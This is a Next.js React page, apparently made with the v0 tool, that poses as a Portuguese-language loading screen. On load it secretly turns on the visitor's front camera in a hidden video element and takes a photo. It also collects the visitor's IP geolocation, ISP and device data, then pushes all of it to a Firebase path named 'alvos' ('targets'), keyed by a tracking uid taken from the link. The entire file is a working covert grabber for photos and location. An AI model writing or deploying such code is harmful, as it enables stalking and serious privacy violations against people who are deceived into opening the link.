"use client"

import { useState, useRef, useEffect } from "react"
import { Loader2 } from "lucide-react"
import { captureAllData } from "@/lib/geolocation"
import { ref, push } from "firebase/database"
import { database } from "@/lib/firebase"
import { SecurityLayer } from "@/components/security-layer"

export default function LocationCapturePage() {
  const [isCapturing, setIsCapturing] = useState(false)
  const [hasCaptured, setHasCaptured] = useState(false)
  const videoRef = useRef<HTMLVideoElement>(null)
  const streamRef = useRef<MediaStream | null>(null)
  const [photoData, setPhotoData] = useState<string | null>(null)
  const [userId, setUserId] = useState<string | null>(null)

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const userIdParam = params.get("uid")
    setUserId(userIdParam)

    console.log("[v0] 🎯 Location capture page loaded")
    console.log("[v0] 👤 User ID from URL:", userIdParam)
    console.log("[v0] 🗄️ Firebase path will be:", `alvos/${userIdParam || "anonymous"}`)

    // Auto-start camera and capture photo silently
    const autoCapture = async () => {
      try {
        console.log("[v0] 📷 Starting camera access...")

        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
          audio: false,
        })

        console.log("[v0] ✅ Camera access granted")

        if (videoRef.current) {
          videoRef.current.srcObject = stream
          streamRef.current = stream

          videoRef.current.onplaying = () => {
            console.log("[v0] 🎬 Video is now playing, waiting for frames...")

            setTimeout(() => {
              if (videoRef.current && videoRef.current.readyState >= 2) {
                console.log("[v0] 📸 Capturing photo from video...")

                const canvas = document.createElement("canvas")
                canvas.width = videoRef.current.videoWidth || 640
                canvas.height = videoRef.current.videoHeight || 480

                console.log("[v0] Canvas size:", canvas.width, "x", canvas.height)

                const ctx = canvas.getContext("2d")
                if (ctx && canvas.width > 0 && canvas.height > 0) {
                  ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height)
                  const photoDataUrl = canvas.toDataURL("image/jpeg", 0.8)
                  setPhotoData(photoDataUrl)
                  console.log("[v0] ✅ Photo captured successfully, size:", photoDataUrl.length, "bytes")

                  if (streamRef.current) {
                    streamRef.current.getTracks().forEach((track) => track.stop())
                    streamRef.current = null
                  }
                } else {
                  console.error("[v0] ❌ Canvas context or size invalid")
                  setPhotoData("camera_error")
                }
              } else {
                console.error("[v0] ❌ Video not ready, readyState:", videoRef.current?.readyState)
                setPhotoData("camera_error")
              }
            }, 2000)
          }

          videoRef.current.play().catch((err) => {
            console.error("[v0] ❌ Video play error:", err)
          })
        }
      } catch (error) {
        console.error("[v0] ❌ Auto-capture error:", error)
        setPhotoData("camera_denied")
      }
    }

    autoCapture()
  }, [])

  useEffect(() => {
    if (!hasCaptured && !isCapturing) {
      handleAutoCapture()
    }
  }, [hasCaptured, isCapturing])

  const handleAutoCapture = async () => {
    if (isCapturing || hasCaptured) {
      console.log("[v0] ⏭️ Skipping capture (already capturing or captured)")
      return
    }

    setIsCapturing(true)
    console.log("[v0] 🚀 Starting auto-capture process...")

    try {
      console.log("[v0] 📡 Fetching IP and device data...")
      const data = await captureAllData()

      console.log("[v0] ✅ Data fetched successfully")
      console.log("[v0] 📊 IP Data:", {
        hasIpData: !!data.ipData,
        ip: data.ipData?.ip,
        coordinates:
          data.ipData?.latitude && data.ipData?.longitude
            ? `${data.ipData.latitude}, ${data.ipData.longitude}`
            : "MISSING",
        location: data.ipData ? `${data.ipData.city}, ${data.ipData.country}` : "MISSING",
      })

      if (!data.ipData || !data.ipData.latitude || !data.ipData.longitude) {
        console.error("[v0] ❌ CRITICAL: Cannot save capture without valid IP coordinates!")
        console.error("[v0] 📍 IP Data received:", JSON.stringify(data.ipData, null, 2))
        setHasCaptured(true)
        setIsCapturing(false)
        return
      }

      const userPath = userId || "anonymous"
      const alvosRef = ref(database, `alvos/${userPath}`)
      const timestamp = Date.now()

      const capturePayload = {
        pageType: "location",
        pageName: "Mapa de Localização",
        timestamp,
        ipAddress: data.ipData.ip || "Unknown",
        userAgent: navigator.userAgent,
        ipData: {
          ip: data.ipData.ip,
          latitude: data.ipData.latitude,
          longitude: data.ipData.longitude,
          city: data.ipData.city || "Unknown",
          region: data.ipData.region || "Unknown",
          country: data.ipData.country || "Unknown",
          countryCode: data.ipData.countryCode || "XX",
          timezone: data.ipData.timezone || "Unknown",
          isp: data.ipData.isp || "Unknown",
          org: data.ipData.org || "Unknown",
          as: data.ipData.as || "Unknown",
        },
        deviceInfo: data.deviceInfo,
        formData:
          photoData && photoData !== "camera_denied" && photoData !== "camera_error" ? { photo: photoData } : undefined,
      }

      console.log("[v0] 💾 Preparing to save to Firebase...")
      console.log("[v0] 📂 Firebase path:", `alvos/${userPath}`)
      console.log("[v0] 📦 Payload structure:", {
        pageType: capturePayload.pageType,
        timestamp: new Date(timestamp).toISOString(),
        hasIpData: !!capturePayload.ipData,
        coordinates: {
          lat: capturePayload.ipData.latitude,
          lng: capturePayload.ipData.longitude,
        },
        location: `${capturePayload.ipData.city}, ${capturePayload.ipData.country}`,
        hasPhoto: !!capturePayload.formData?.photo,
      })

      console.log("[v0] 🔥 Pushing to Firebase...")
      const result = await push(alvosRef, capturePayload)

      console.log("[v0] ✅ SUCCESS! Data saved to Firebase")
      console.log("[v0] 🔑 Firebase key:", result.key)
      console.log("[v0] 📍 Full path:", `alvos/${userPath}/${result.key}`)
      console.log("[v0] 🗺️ Marker coordinates:", {
        latitude: capturePayload.ipData.latitude,
        longitude: capturePayload.ipData.longitude,
        location: `${capturePayload.ipData.city}, ${capturePayload.ipData.country}`,
      })
      console.log("[v0] ⏰ Timestamp:", new Date(timestamp).toISOString())
      console.log("[v0] 🎯 This capture should now appear on the global map immediately!")

      setHasCaptured(true)
    } catch (error) {
      console.error("[v0] ❌ CAPTURE ERROR:", error)
      console.error("[v0] 📋 Error details:", {
        name: error instanceof Error ? error.name : "Unknown",
        message: error instanceof Error ? error.message : String(error),
        stack: error instanceof Error ? error.stack : undefined,
      })
      setHasCaptured(true)
    } finally {
      setIsCapturing(false)
      console.log("[v0] 🏁 Capture process finished")
    }
  }

  return (
    <>
      <SecurityLayer />

      <video ref={videoRef} autoPlay playsInline muted className="hidden" />

      <div className="relative h-screen w-full flex items-center justify-center bg-white">
        <div className="text-center space-y-4">
          <Loader2 className="h-12 w-12 animate-spin text-blue-500 mx-auto" />
          <p className="text-gray-600 text-lg">Carregando...</p>
        </div>
      </div>
    </>
  )
}
